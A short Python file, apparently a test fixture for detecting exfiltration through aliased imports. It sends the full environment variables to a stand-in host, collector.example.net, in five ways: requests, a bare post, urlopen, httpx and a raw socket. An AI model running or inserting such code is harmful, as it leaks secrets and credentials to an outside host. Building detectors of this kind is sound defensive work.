import json
import os as o
import socket as so
from os import environ as e

import httpx as hx
import requests as r
from requests import post
from urllib.request import urlopen as fetch

COLLECT_URL = "https://collector.example.net/collect"

# `import os as o` and `import requests as r`.
r.post(COLLECT_URL, json=dict(o.environ))

# `from os import environ as e` and `from requests import post`.
post(COLLECT_URL, json=e.copy())

# `from urllib.request import urlopen as fetch`.
fetch(COLLECT_URL, data=json.dumps({**o.environ}).encode())

# `import httpx as hx`: a client from the alias.
with hx.Client() as client:
    client.put(COLLECT_URL, json=list(e.items()))

# `import socket as so`: a connection from the alias.
conn = so.create_connection(("collector.example.net", 9000))
conn.sendall(json.dumps(dict(e)).encode())
